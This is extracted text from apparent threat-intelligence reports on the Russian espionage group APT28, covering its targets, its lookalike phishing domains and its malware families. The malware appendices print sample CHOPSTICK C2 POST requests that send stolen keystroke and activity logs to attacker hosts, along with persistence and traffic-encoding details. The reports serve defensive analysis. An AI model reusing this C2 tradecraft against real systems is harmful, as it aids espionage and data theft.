Tbilisi. The text of the document purports to provide domain and user group setup APT28 made at least two specific attempts to target the Georgian Ministry of Internal Affairs.Georgian Ministry of Internal Affairs (MIA)APT 28: A Window into Russia™s Cyber Espionage Operations? 9 fireeye.com Figure 1: Georgian MIA-related decoy information for internal Windows XP and Windows 7 systems. APT28 possibly crafted this document to appear legitimate to all MIA system users and intended to breach the MIA network specifically using the embedded malware.APT28 Targeting of the Georgian Ministry of DefenseAPT28 also appeared to target Georgia™s MOD along with a U.S. defense contractor that was training the Georgian military. APT28 used a lure document that installed a SOURFACE downloader (further discussed in the Malware section) and contained a listing of birthdays for members of a working group between the Georgian MOD and the U.S. defense contractor. The U.S. contractor was involved in a working group to advise the MOD and Georgian Armed Forces, assess Georgia™s military capabilities, and develop a military training program for the country. 10 fireeye.com Figure 2: Excerpt of APT28™s letter to a journalist writing on Caucasus-related issues We believe that APT28™s targeting of the MOD aligns with Russian threat perceptions. The growing U.S.-Georgian military relationship has been a source of angst for Russia. Georgia and Russia severed diplomatic relations following the Russia-Georgia War in 2008, and Georgia has since sought to align itself more closely with western security organizations. Additionally, in June 2014, despite Russia™s vocal objections, Georgia, along with Ukraine and Moldova, signed association accords with the EU. 5 This move placed all three countries more firmly in the EU™s political, economic, and security spheres of influence. Georgian military security issues, particularly with regard to U.S. cooperation and NATO, provide a strong incentive for Russian state-sponsored threat actors to steal information that sheds light on these topics.APT28 Targeting a Journalist Covering the Caucasus Another one of APT28™s lures appeared to target a specific journalist covering issues in the Caucasus region. In late 2013, APT28 used a lure that contained a letter addressing a journalist by his first name and claiming to originate from a ﬁChief Coordinatorﬂ in Reason Magazine™s ﬁCaucasian Issues Departmentﬂ - a division that does not appear to exist. 6 (Reason Magazine is a US-based magazine) The letter welcomed the individual as a contributor and requested topic ideas and identification information in order to establish him at the magazine. In the background, the decoy document installed a SOURFACE backdoor on the victim™s system. We wish our cooperation will be both profitable and trusted. Our aim in the Caucasian region is to help people who struggle for their independence, liberty and human rights. We all know, that world is often unfair and cruel, but all together we can make it better. Send your articles on this email Œ in Russian or English, please. There are some difficulties with Caucasian languages, but we™ll solve the problem pretty soon, I hope. 5 ﬁThe EU™s Association Agreements with Georgia, the Republic of Moldova and Ukraineﬂ. European Union Press Release Database. 23 June 2014. Web. http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm 6 We attempted to identify candidate journalists in the country. One of these was a Georgian national of Chechen descent, whose work appears to center on Chechen and human rights issues. Ultimately, however, we cannot confirm the identity of the target(s). Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting. 11 fireeye.com The body of the letter suggests that APT28 actors are able to read at least two languages Œ Russian and English. The grammar of the letter also indicates that English is not the author™s first language, despite it purportedly originating from a US-based magazine. This implies that Russian may be the APT28 author™s preferred language.Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting. Several other nation states are suspected of targeting journalists and dissidents to monitor their activity, including China and Iran. 7,8 Journalists in the Caucasus working on Caucasus independence issues would be a prime target for intelligence collection for Moscow. Journalists critical of the Kremlin have long been targets of surveillance and harassment, and a number of governments and human rights organizations have publicly criticized the government for its treatment of journalists and its increasing consolidation of control over the media. 9 APT28™s Other Targets in the Caucasus We have seen APT28 register at least two domains mimicking the domains of legitimate organizations in the Caucasus, as shown in the table below. One APT28 domain imitated a key Chechen-focused news website, while the other appeared to target members of the Armenian military by hosting a fake login page. Of particular note, the Kavkaz Center is a Chechen-run website designed to present an alternative view to the long-running conflict between Russia and Chechen separatists. In 200410 and 2013,11 Russia™s Foreign Minister voiced his displeasure that a Swedish company continues to host the Kavkaz Center website. 7 Moran, Ned, Villeneuve, Nart, Haq, Thofique, and Scott, Mike. ﬁOperation Saffron Roseﬂ.

The Kremlin has long regarded the former Soviet Republics and satellite states as in its sphere of economic, political, and military interest. Over the past two decades, as many of these states joined NATO and the EU, Russia has attempted to regain its influence in the region. Many of APT28™s targets parallel this continued focus on Eastern European governments and militaries. APT28 Targets Eastern European Government Organizations We have evidence that APT28 made at least two attempts to compromise Eastern European government organizations: In a late 2013 incident, a FireEye device deployed at an Eastern European Ministry of Foreign Affairs detected APT28 malware in the client™s network.More recently, in August 2014 APT28 used a lure (Figure 3) about hostilities surrounding a Malaysia Airlines flight downed in Ukraine in a probable attempt to compromise the Polish government. A SOURFACE sample employed in the same Malaysia Airlines lure was referenced by a Polish computer security company in a blog post. 12 The Polish security company indicated that the sample was ﬁsent to the government,ﬂ presumably the Polish government, given the company™s location and visibility. 12 ﬁMHT, MS12-27 Oraz *malware*.infoﬂ Malware@Prevenity. 11 August 2014.

These domain registrations not only suggest that APT28 is interested in Eastern European political affairs, but also that the group targets Eastern European governments directly. In addition, APT28 used one domain for command and control sessions (baltichost.org) that was themed after the Baltic Host exercises. Baltic Host is a multinational logistics planning exercise, hosted annually since 2009 by one of the three Baltic States (Estonia, Latvia, and Lithuania, all three of which are on Russia™s border) on a rotational basis. In June 2014, this event was integrated with a larger U.S. Army training event, and focused on exercises to improve interoperability with regional allies and partners.13, 14 This domain registration suggests that APT28 sought to target individuals either participating in the exercises or interested in Baltic military and security matters. Such targets would potentially provide APT28 with sensitive tactical and strategic intelligence concerning regional military capabilities and relationships. These exercises are a particular point of interest in Moscow: pro-Kremlin press cited Russia™s interpretation of these military exercises and NATO™s involvement as a ﬁsign of aggression,ﬂ and Russia™s Foreign Minister publicly stated that the exercise was ﬁa demonstration of hostile intention.ﬂ 15 Table 2: Examples of APT28 domains imitating legitimate Eastern European organization names APT28 DomainReal Domainstandartnevvs.comBulgarian Standart News website (standartnews.com)novinitie.com, n0vinite.comBulgarian Sofia News Agency website (novinite.com)qov.hu.comHungarian government domain (gov.hu) q0v.pl, mail.q0v.plPolish government domain (gov.pl) and mail server domain (mail.gov.pl) poczta.mon.q0v.plPolish Ministry of Defense mail server domain (poczta.mon.gov.pl) 13 ﬁSaber Strike and Baltic Host kick off in Latvia, Lithuania and Estonia™.

APT28™s lures and domain registrations also demonstrate their interest in NATO and other European security organizations. NATO remains a chief Russian adversary, or in the words of Russia™s 2010 military doctrine, a ﬁmain external military dangerﬂ particularly as it moves ﬁcloser to the borders of the Russian Federation.ﬂ 16 As the traditional western counterweight to the Soviet Union, Russia regards NATO, particularly NATO™s eastward expansion, as a threat to Russia™s strategic stability. APT28 also registered a domain name imitating the Organization for Security and Cooperation in Europe (OSCE), an intergovernmental organization that has cited widespread fraud in numerous Russian state elections. Insider information about NATO, the OSCE and other security organizations would inform Russian political and military policy. Several of the domains APT28 registered imitated NATO domain names, including those of NATO Special Operations Headquarters and the NATO Future Forces Exhibition. We also observed a user that we suspect works for NATO HQ submit an APT28 sample to VirusTotal, probably as a result of receiving a suspicious email.

We identified an APT28 lure containing a decoy document with a list of British officers and U.S. and Canadian military attachés in London. Finally, APT28 used a lure that contained an apparent non-public listing of contact information for defense attachés in the ﬁAnkara Military Attaché Corps (AMAC),ﬂ which appears to be a professional organization of defense attachés in Turkey. Figure 4: Decoy document used against military attaches in 2012 16 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? APT28 Targets European Defense ExhibitionsIn addition to targeting European security organizations and governments, it appears that APT28 is targeting attendees of European defense exhibitions. Some of the APT28- registered domains imitated those of defense events held in Europe, such as the Farnborough Airshow 2014, EuroNaval 2014, EUROSATORY 2014, and the Counter Terror Expo. In September 2014, APT28 registered a domain (smigroup-online.co.uk) that appeared to mimic that for the SMi Group, a company that plans events for the ﬁDefence, Security, Energy, Utilities, Finance and Pharmaceutical sectors.ﬂ Among other events, the SMi Group is currently planning a military satellite communications event for November 2014. Targeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies, as well as the victim organizations™ operations, communications, and future plans. Targeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies. 17 fireeye.com APT28 has targeted a variety of organizations that fall outside of the three themes we highlighted above. However, we are not profiling all of APT28™s targets with the same detail because they are not particularly indicative of a specific sponsor™s interests. They do indicate parallel areas of interest to many governments and do not run counter to Russian state interests.

APT28 MALWARE INDICATES SKILLED RUSSIAN DEVELOPERS APT28™s tools are suggestive of the group™s skills, ambitions, and identity. Our analysis of some of the group™s more commonly used tools indicates that APT28 has been systematically updating their tools since 2007. APT28 is most likely supported by a group of developers creating tools intended for long-term use and versatility, who make an effort to obfuscate their activity. This suggests that APT28 receives direct ongoing financial and other resources from a well-established organization, most likely a nation state government. APT28™s malware settings suggest that the developers have done the majority of their work in a Russian language build environment during Russian business hours, which suggests that the Russian government is APT28™s sponsor. Some of APT28™s more commonly used tools are the SOURFACE downloader, its second stage backdoor EVILTOSS, and a modular family of implants that we call CHOPSTICK.SOURFACE: This downloader is typically called Sofacy within the cyber security community. However because we have observed the name ﬁSofacyﬂ used to refer to APT28 malware generally (to include the SOURFACE dropper, EVILTOSS, CHOPSTICK, and the credential harvester OLDBAIT), we are using the name SOURFACE to precisely refer to a specific downloader. This downloader obtains a second-stage backdoor from a C2 server. CORESHELL is an updated version of SOURFACE. EVILTOSS: This backdoor has been delivered through the SOURFACE downloader to gain system access for reconnaissance, monitoring, credential theft, and shellcode execution. CHOPSTICK: This is a modular implant compiled from a software framework that provides tailored functionality and flexibility. Our analysis of some of the group™s more commonly used tools indicates that APT28 has been systematically updating their malware since 2007. 20 fireeye.com A number of the malware variants that we profile below, especially the CHOPSTICK family, demonstrate formal coding practices indicative of methodical, diligent programmers. The modularity of CHOPSTICK alone, with its flexible and lasting platform, demonstrates planning for long-term use and versatility. We have also noted that APT28 tailors implants to their target environments, configuring them to use local network resources such as email servers. APT28 has attempted to obfuscate their code and implement counter-analysis techniques:Figure 6: Typical deployment of SOURFACE ecosystem Spearphishing EmailDocument with exploitDropper malware SOURFACE downloader Deploys 2nd stage droppers 2nd stage implantObtains 2nd stageC2 ServerOne of the latest samples of CORESHELL includes counter-reverse engineering tactics via unused machine instructions. This would hinder static analysis of CORESHELL behavior by creating a large amount of unnecessary noise in the disassembly. A number of CORESHELL droppers also conduct runtime checks, attempting to determine if they are executing in an analysis environment, and if so, they do not trigger their payloads. Many samples across the SOURFACE/ CORESHELL, CHOPSTICK, and EVILTOSS 21 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? malware families obfuscate strings that are decoded at runtime. Two of the malware families (SOURFACE/CORESHELL and EVILTOSS) use the same decryption sequence and similar algorithms for string encoding and decoding. These families encode their strings at compile time using a custom stream cipher. From a high level, these ciphers share a similar design across the malware families but differ slightly in the internal arithmetic operations. APT28 has employed RSA encryption to protect files and stolen information moved from the victim™s network to the controller. APT28 has made incremental and systematic changes to the SOURFACE downloader and its surrounding ecosystem since as early as 2007. These changes indicate a long-standing and dedicated development effort behind APT28. We have observed samples of the SOURFACE downloader compiled between 2007 and 2014. We call SOURFACE (samples are frequently named netids.dll) a first stage downloader because its primary job is to retrieve a second stage payload from a C2 server. Until 2013, the SOURFACE downloader used hard-coded IP addresses for C2 communications, whereas the future CORESHELL samples use domains.EVOLUTION OF SOURFACE ECOSYSTEM INDICATES SYSTEMATIC DEVELOPMENT WHAT IS A MALWARE ECOSYSTEM? First, a malware family is a collection of malware in which each sample shares a significant amount of code with all of the others. There are exceptions: for example, some files contain public and standard code libraries that we do not take into consideration when making a family determination.A malware ecosystem is a group of malware families that work together to perform the same objective. Perhaps the simplest and most typical ecosystem is a dropper and a backdoor that are used together. They may not share the same code structure, but they are related because one drops and installs the other. The ecosystem surrounding the SOURFACE downloader frequently consists of a dropper, which installs SOURFACE. The SOURFACE downloader then receives another dropper from its C2 server, and this second dropper installs a second stage backdoor, which is usually EVILTOSS. 22 fireeye.com In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader. They started by changing the compiled DLL name to ﬁcoreshell.dllﬂ and making minor changes to the network communications, as seen in Figure 7.The hostname, volume serial number and OS version data are encoded in the new URL format. As seen in the table below, the SOURFACE/ CORESHELL developers also made other modifications that changed the exported function name and file size over time. 17 SOURFACE with minor changes to network communications (see Figure 7). 18 Basic anti-debug measures added (process listing, rand timing, is DebuggerPresent). 19 Switches from loading a secondary DLL (netui.dll/WinIDS.dll) to uploading the contents of %temp%\\\\chkdbg.log. 20 Statically links msvcrt library. 21 Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used, then reversed back after use. 22This version added assembly level obfuscation, which slows down analysis. This variant requires the OS to be at least Windows Vista.

However, it contains more capabilities, including the ability to provide access to the file system and registry, enumerate network resources, create processes, log keystrokes, access stored credentials, and execute shellcode. The backdoor encrypts data that it uploads with an RSA public key. Many of its variants we have seen are named netui.dll. EVILTOSS variants may use the Simple Mail Transfer Protocol (SMTP) to send stolen data in an attachment named ﬁdetaluri.datﬂ. The backdoor attaches this file to a preformatted email and sends it out through a victim™s mail server. Interestingly, we found an antivirus report from 200423 detailing what appears to be an early variant of EVILTOSS. The backdoor was installed alongside the NATO-themed decoy document depicted in Figure 8. The backdoor sent data via SMTP to nato_smtp@mail.ru and received its tasking via POP from nato_pop@mail.ru. Although we have not conclusively attributed this sample to APT28, it does suggest the possibility that APT28 has been operating since as early as 2004.24 23 http://ae.norton.com/security_response/print_writeup.jsp?docid=2004-081915-1004-99 24 Although the malware family and interest in NATO make it likely that APT28 was involved, we cannot conclusively attribute this sample to APT28 based on these factors alone. We have no evidence that they controlled the C2 for this malware or were using EVILTOSS in 2004. APT28 could have possibly obtained this source code from another group of actors. Also, malware can be passed from group to group. The other malware that we associate with APT28 in this paper is more strongly attributed to the group using additional factors, some of which we mention in Appendix A.In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader. 24 fireeye.com During our research, we discovered that APT28 uses a backdoor developed using a modular framework. We call this backdoor CHOPSTICK, a somewhat ironic name that comes from our semi-random name generator. The modular design allows flexible options for compiling variants with different capabilities as needed, as well as deploying additional capabilities at runtime. This allows the developers to make targeted implants, including only the capabilities and protocols necessary for a specific environment. Such a modular framework suggests the group has had an organized development effort since as early as 2007. A formal development environment, in which code is versioned and well-organized, would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time. CHOPSTICK variants may move messages and information using at least three methods:1. Communications with a C2 server using HTTP. These protocols are covered in more detail in Appendix D. 2. Email sent through a specified mail server. One CHOPSTICK v1 variant contained modules and functions for collecting keystroke logs, Microsoft Office documents, and PGP files. The monitoring for new files of interest is performed by a ﬁDirectory Observerﬂ module. In one sample this information was intended to be sent via SMTP using a Georgian MIA mail server. It used one of four embedded sender email addresses (@mia.gov.ge) to send files via email to another email address on the same mail server. All information required for the email was hardcoded in the backdoor. 3. Local copying to defeat closed networks. One variant of CHOPSTICK focuses on apparent air gap / closed network capabilities by routing messages between local directories, the registry and USB drives. A modular development framework suggests the group has had an organized development effort since as early as 2007. MODULAR IMPLANTS INDICATE A FORMAL DEVELOPMENT ENVIRONMENT 25 fireeye.com During our research into APT28™s malware, we noted two details consistent across malware samples. The first was that APT28 had consistently compiled Russian language settings into their malware. The second was that malware compile times from 2007 to 2014 corresponded to normal business hours in the UTC + 4 time zone, which includes major Russian cities such as Moscow and St. Petersburg. Use of Russian and English Language Settings in PE ResourcesPE resources include language information that can be helpful if a developer wants to show user interface items in a specific language.25 Non-default language settings packaged with PE resources are dependent on the developer™s build environment. Each PE resource includes a ﬁlocaleﬂ identifier with a language ID ﬁcomposed of a primary language identifier indicating the language and a sublanguage identifier indicating the country/region.ﬂ 26 At the time of the writing of this paper, we had identified 103 malware samples that were both attributed to APT28 and contained PE resources. Table 5 shows the locale identifiers 27 with associated language and country/region for these samples.Table 5: Locale and language identifiers associated with APT28 malware Locale ID Primary languageCountry/RegionNumber of APT28 samples0x0419Russian (ru)Russia (RU)590x0409English (en)United States (US)270x0000 or 0x0800Neutral locale / System default locale languageNeutral160x0809English (en)United Kingdom (GB)1APT28 MALWARE INDICATES RUSSIAN SPEAKERS IN A RUSSIAN TIME ZONE 25Microsoft Developer Network Œ Multiple Language Resources http://msdn.microsoft.com/en-us/library/cc194810.aspx 26, 27 Microsoft Developer Network Œ Language Identifier Constants and Strings http://msdn.microsoft.com/en-us/library/dd318693.aspx 26 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? The samples with Russian language settings were compiled between late 2007 and late 2013, as depicted in Figure 9. This consistency over a long timeframe suggests that the developers of APT28 malware were using a build environment Figure 9: Number of APT28 samples with Russian language settings by compile month2007200820092010201120122013DecemberMarch MayAugustFebruaryMaySeptemberFebruaryMarch AugustSeptemberOctoberNovemberDecemberAprilJuneSeptemberDecemberAprilMayJuneJulyOctoberDecemberJanuaryJulyAugustOctoberNovemberDecember0 1 2 3 4 5 6 7 8 9with Russian language settings at least some of the time and made no effort to obscure this detail. Overall, the locale IDs suggest that APT28 developers can operate in both Russian and English. 27 fireeye.com Compile Times Align with Working Hours in Moscow and St. Petersburg Of the 140 malware samples that we have attributed to APT28 so far, over 89% were compiled between 0400 and 1400 UTC time, as depicted in Figure 10. Over 96% were compiled between Monday and Friday. This parallels the working hours in UTC+0400 (that is, compile times begin about 8AM and end about 6PM in this time zone). This time zone includes major Russian cities such as Moscow and St. Petersburg.

We assess that APT28 is most likely sponsored by the Russian government. We summarize our key observations about APT28 in Figure 11 below. APT28™s characteristicsŠtheir targeting, malware, language, and working hoursŠhave led us to conclude that we are tracking a focused, long- standing espionage effort.

These individuals may share the same set of tasks, coordinate targets, and share tools and methodology. They work together to gain access to their targets and steal data.The art of attributing disparate intrusion activities to the same threat group is not always simple. Different groups may use similar intrusion methodologies and common tools, particularly those that are widely available on the Internet, such as pwdump, HTran, or Gh0st RAT. There may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing of personnel. Individual threat actors may move between groups either temporarily or permanently. A threat actor may also be a private citizen who is hired by multiple groups. Multiple groups, on occasion, compromise the same target within the same timeframe. Distinguishing one threat group from another is possible with enough information, analytical experience, and tools to piece it all together. We can analyze multiple incidents and tell by the evidence left behind that a given incident was the result of one threat group and not another. Threat actors leave behind various forensic details. They may send spear phishing emails from a specific IP address or email address. Their emails may contain certain patterns; files have specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have command and control IP addresses or domain names embedded. These are just a few examples of the myriad of forensic details that we consider when distinguishing one threat group from another. At the most basic level, we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same actor or group of actors were involved. We track all of the indicators and significant linkages associated with identified threat groups in a proprietary database that comprises millions of nodes and linkages between them. In this way, we can always go back and answer ﬁwhyﬂ we associated cyber threat activity with a particular group. 30 fireeye.com APPENDIX B: TIMELINE OF APT28 LURESYEARLURE TOPICMALWARE 2010Iran™s work with an international organization (internal document) SOURFACE 2011File named ﬁmilitary cooperation.docﬂSOURFACE, OLDBAIT2011Georgian language IT document for Ministry of Internal Affairs (internal document) SOURFACE 2011ﬁUSB Disk Security is the best software to block threats that can damage your PC or compromise your personal information via USB storage.ﬂSOURFACE 2012Food security in Africa (ﬁFood and nutrition crisis reaches peak but good forecast for 2013ﬂ) SOURFACE 2012ﬁIDF Soldier Killed and another injured in a Terror Attackﬂ SOURFACE 2012ﬁEcho Crisis Reportﬂ on Portugal™s forest fires SOURFACE 2012ﬁFBI to monitor Facebook, Twitter, Myspaceﬂ SOURFACE 2012Georgia (US state, not the country of Georgia) murder case uncovers terror plot SOURFACE 2012Military attaches in London (internal document) SOURFACE 2013South Africa MFA document CHOPSTICK, CORESHELL2013John Shalikashvili (Georgian-Polish-American US General) Questionnaire CORESHELL2013Asia Pacific Economic Cooperation Summit 2013 reporters (internal document) SOURFACE 2013Defense Attaches in Turkey (internal document) CHOPSTICK, CORESHELL2013Turkish Cypriot news about Syria chemical weapons CHOPSTICK, CORESHELL2013Georgian language document about drivers™ licenses (internal document) EVILTOSS 2013Apparent Reason Magazine-related lure sent to a journalist CORESHELL2014Mandarin language document, possibly related to a Chinese aviation group (non-public document) CORESHELL2014Netherlands-Malaysia cessation of hostilities; related to Ukraine airline attack CORESHELL 31 fireeye.com SOURFACE is a downloader that obtains a second stage backdoor from a C2 server. Over time the downloader has evolved and the newer versions, usually compiled with the DLL name ‚coreshell.dll™, are distinct enough from the older versions that we refer to it as SOURFACE/CORESHELL or simply CORESHELL. This appendix focuses on these newer versions. CORESHELL uses two threads to communicate with its C2 server. The first thread sends beacons that contain the process listing of the compromised host. The second thread is responsible for downloading and executing stage APPENDIX C: SOURFACE/CORESHELL two payloads. Messages are sent using HTTP POST requests whose bodies contain encrypted and Base64 encoded data. The encryption algorithm is a custom stream cipher using a six-byte key. Commands from the controller to the CORESHELL implant are encrypted using another stream cipher but this time using an eight-byte key. CORESHELL has used the same user agent string (ﬁMSIE 8.0ﬂ) that SOURFACE previously used, but in more recent samples CORESHELL uses the default Internet Explorer user agent string obtained from the system. Figure 11 shows an example POST request.

This framework allows for a diverse set of capabilities across malware variants sharing a common code base. CHOPSTICK may communicate with external servers using SMTP or HTTP. This appendix documents variants using HTTP communications. The first time CHOPSTICK is executed, it may encrypt and store configuration data in the Registry key HKU\\\\S-1-5-19_Classes\\\\Software\\\\Microsoft\\\\MediaPlayer\\\\{E6696105-E63E-4EF1-939E-15DDD83B669A}\\\\chnnl. The user HKU\\\\S-1-5-19 corresponds to the LOCAL_SERVICE account SID. The configuration block is encrypted using RC4 encryption. The key is a combination of a 50-byte static key and a four-byte salt value randomly generated at runtime. The static key is derived from opcodes in the backdoor. CHOPSTICK collects detailed information from the host including the Windows version, CPU architecture, Windows Firewall state, User Account Control (UAC) configuration settings on Windows Vista and above and Internet Explorer settings. It also tests for the installation of specific security products (Table 9) and applications (Table 10).

It creates a thread that records user activity on the host, capturing desktop screenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window contents (text, context menus, etc.). User activity is captured once every 500 milliseconds and logged in an HTML-like format. The thread writes user activity log messages to the ﬁ check_mes_v5555ﬂ mailslot in plain text. CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the encrypted message in an edg6EF885E2.tmp temporary file. The RC4 encryption used here also uses a 50- byte static key plus four-byte random salt value. After approximately 60 seconds of execution time, CHOPSTICK begins communicating with one of its C2 servers over HTTP. After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2. tmp to the C2 server using HTTP POST requests. It does not wait for a response from the server to begin uploading. Once the contents of edg6EF885E2.tmp are uploaded, CHOPSTICK deletes the file. Figure 13 below contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp. Figure 13: Sample CHOPSTICK v2 HTTP POST POST /search/?btnG=D-3U5vY&utm=79iNI&ai=NPVUnAZf8FneZ2e_qptjzwH1Q&PG3pt=n-B9onK2KCi HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0 Host: windows-updater.com Content-Length: 77 Cache-Control: no-cache1b2x7F4Rsi8_e4N_sYYpu1m7AJcgN6BzDpQYv1P2piFBLBqghXiHY3SIfe8cUHHYojeXfeyyOhw==28A mailslot is a Windows inter-process communication (IPC) mechanism similar to a named pipe, but is designed for one-way communications between processes and can also be used across the network. 38 fireeye.com CHOPSTICK uses a URL-safe Base64 encoding, using an alphabet that substitutes ﬁ+ﬂ and ﬁ/ﬂ for ﬁ-ﬂ and ﬁ_ﬂ, respectively. Each HTTP request contains multiple Base64 encoded URL parameters, however only one parameter contains information encoded by the malware (ﬁai=ﬂ) and the rest of the URL parameters appear to be randomly generated per request. CHOPSTICK encrypts an 11-byte sequence in the ﬁai=ﬂ parameter. The purpose of this parameter appears to be to uniquely identify the particular instance of the backdoor to the C2 server. The Base64 encoded text of this parameter begins with a number of randomly generated alphabetical characters presumably intended to prevent people from Base64 decoding the whole string without some knowledge of how the malware family works. The first four bytes of the message are an XOR key for the remainder of the data. Once decrypted using the XOR key, an 11-byte sequence is revealed. The first seven bytes are static, and are hard-coded in CHOPSTICK, while the last four bytes appear to be unique. The message body of the POST request is also Base64 encoded. This encoded string is also prefixed with random characters designed to break the output of a Base64 decode operation on the entire string. The first 15 bytes of the decoded message body comprise another 11-byte sequence similar to the sequence stored in the ﬁai=ﬂ parameter as described above. Decrypting these bytes yields another static seven-byte sequence, followed by four unique bytes. The remainder of the message body consists of the RC4 encrypted data containing the HTML-formatted user activity log, edg6EF885E2.tmp. After uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using HTTP GET requests. The malware contains code which allows it to load or memory-map external modules that export the following functions: SendRawPacket, GetRawPacket, InitializeExp, DestroyExp, IsActiveChannel, GetChannelInfo, SetChannelInfo, Run, GetModuleInfo, GiveMessage, and TakeMessage. 39 fireeye.com ModularityCHOPSTICK backdoors are compiled within a modularized development framework. This means that two separate CHOPSTICK backdoors may contain vastly different functionality, depending on which modules were included at compile time. The modules that are included in an instance of CHOPSTICK may be reported to the C2 server as part of POST messages. Figure 14 includes an example from a CHOPSTICK v1 variant:Figure 14: Sample CHOPSTICK v1 HTTP POST including module identificationPOST /webhp?rel=psy&hl=7&ai=d2SSzFKlR4l0dRd_ZdyiwE17aTzOPeP-PVsYh1lVAXpLhIebB4= HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0 Host: adobeincorp.com Content-Length: 71 Cache-Control: no-cached2SSzFKchH9IvjcM55eQCTbMbVAU7mR0IK6pNOrbFoF7Br0Pi__0u3Sf1Oh30_HufqHiDU= 40 fireeye.com To decode the POST content, the first step is to remove characters from the Base64 string (the number of characters to remove may vary between different communication channels). In the example from Figure 14, the number of characters removed is seven. Once these characters are removed the decoded (but still encrypted) text looks like this: 00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r..ﬂ..3.^@$.1.@S 00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........lZ....>/ 00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 .....S..O.....5The first two words (ﬁ72 11ﬂ and ﬁfd 22ﬂ) are checksums that are used to validate the message.

If so, is this simply a matter of accepted state espionage, or did it cross a line? Was the DNC breach part of a concerted e˜ort by the Russian Government to interfere with the U.S. presidential election? Unfortunately, we have failed to ask the most consequential question: how will Russia continue to employ a variety of methods, including hacks and leaks, to undermine the institutions, policies, and actors that the Russian Government perceives as constricting and condemning its forceful pursuit of its state aims? Our visibility into the operations of APT28 - a group we believe the Russian Government sponsors - has given us insight into some of the government™s targets, as well as its objectives and the activities designed to further them. We have tracked and pro˚led this group through multiple investigations, endpoint and network detections, and continuous monitoring. Our visibility into APT28™s operations, which date to at least 2007, has allowed us to understand the group™s malware, operational changes, and motivations. This intelligence has been critical to protecting and informing our clients, exposing this threat, and strengthening our con˚dence in attributing APT28 to the Russian Government. SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 1 SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 2OVERVIEW On December 29, 2016, the Department of Homeland Security (DHS) and Federal Bureau of Investigation (FBI) released a Joint Analysis Report con˜rming FireEye™s long held public assessment that the Russian Government sponsors APT28. Since at least 2007, APT28 has engaged in extensive operations in support of Russian strategic interests. The group, almost certainly compromised of a sophisticated and proli˜c set of developers and operators, has historically collected intelligence on defense and geopolitical issues. APT28 espionage activity has primarily targeted entities in the U.S., Europe, and the countries of the former Soviet Union, including governments and militaries, defense attaches, media entities, and dissidents and ˜gures opposed to the current Russian Government. Over the past two years, Russia appears to have increasingly leveraged APT28 to conduct information operations commensurate with broader strategic military doctrine. After compromising a victim organization, APT28 will steal internal data that is then leaked to further political narratives aligned with Russian interests. To date these have included the con˚ict in Syria, NATO-Ukraine relations, the European Union refugee and migrant crisis, the 2016 Olympics and Paralympics Russian athlete doping scandal, public accusations regarding Russian state-sponsored hacking, and the 2016 U.S. presidential election. This report details our observations of APT28™s targeting, and our investigation into a related breach. We also provide an update on shifts in the group™s tool development and use, and summarize the tactics APT28 employs to compromise its victims. SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 3APT28 TARGETING AND INTRUSION ACTIVITY In October 2014, FireEye released APT28: A Window into Russia™s Cyber Espionage Operations?, and characterized APT28™s activity as aligning with the Russian Government™s strategic intelligence requirements. While tracking APT28, we noted the group™s interest in foreign governments and militaries, particularly those of European and Eastern European nations, as well as regional security organizations, such as the North Atlantic Treaty Organization (NATO) and the Organization for Security and Cooperation in Europe (OSCE), among others.

